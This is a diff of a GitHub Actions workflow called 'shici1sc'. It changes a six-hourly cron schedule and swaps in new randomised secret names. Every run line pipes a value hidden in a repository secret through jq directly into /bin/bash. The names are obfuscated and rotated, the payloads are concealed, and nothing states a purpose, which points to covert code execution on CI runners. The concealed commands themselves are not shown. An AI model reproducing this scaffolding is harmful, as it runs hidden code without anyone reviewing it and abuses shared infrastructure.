@@ -1,8 +1,10 @@
 name: shici1sc
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
+    - cron: '56 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,19 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: shici1sc
         env:
-          es5860: ${{ secrets.es5860 }}
+          z45: ${{ secrets.z45 }}
         run: |
-          echo $es5860 | jq -r .mmfxn55 | /bin/bash
-          echo $xnie82 | jq -r .anl40626 | /bin/bash
-          echo $ru7 | jq -r .hvaf48240 | /bin/bash
-          echo $fw9472 | jq -r .varej00 | /bin/bash
-          echo $dj2251 | jq -r .rl3 | /bin/bash
-          echo $th170 | jq -r .oap800 | /bin/bash
-          echo $trdpp729 | jq -r .un6 | /bin/bash
-          echo $ahlbi5086 | jq -r .bkc9570 | /bin/bash
-          echo $vzw88321 | jq -r .v85559 | /bin/bash
-          echo $cbi17 | jq -r .imf0041 | /bin/bash
-          echo $cxnhp96 | jq -r .lf58 | /bin/bash
-          echo $ahxy47085 | jq -r .ukf8672 | /bin/bash
-          echo $wfuoc1 | jq -r .ewi23205 | /bin/bash
+          echo $z45 | jq -r .emck3 | /bin/bash
+          echo $rer13848 | jq -r .zy24 | /bin/bash
+          echo $lg01468 | jq -r .fv0 | /bin/bash
+          echo $d17 | jq -r .cnn726 | /bin/bash
+          echo $yd1 | jq -r .rbztz81164 | /bin/bash
+          echo $hhizk95 | jq -r .y5805 | /bin/bash
+          echo $wnhn34147 | jq -r .qz93 | /bin/bash
+          echo $t142 | jq -r .zb3 | /bin/bash
+          echo $ljii01495 | jq -r .u388 | /bin/bash
+          echo $s02 | jq -r .neffj6162 | /bin/bash
+          echo $xasc71 | jq -r .qd8865 | /bin/bash
+          echo $chra78071 | jq -r .pap8254 | /bin/bash
 
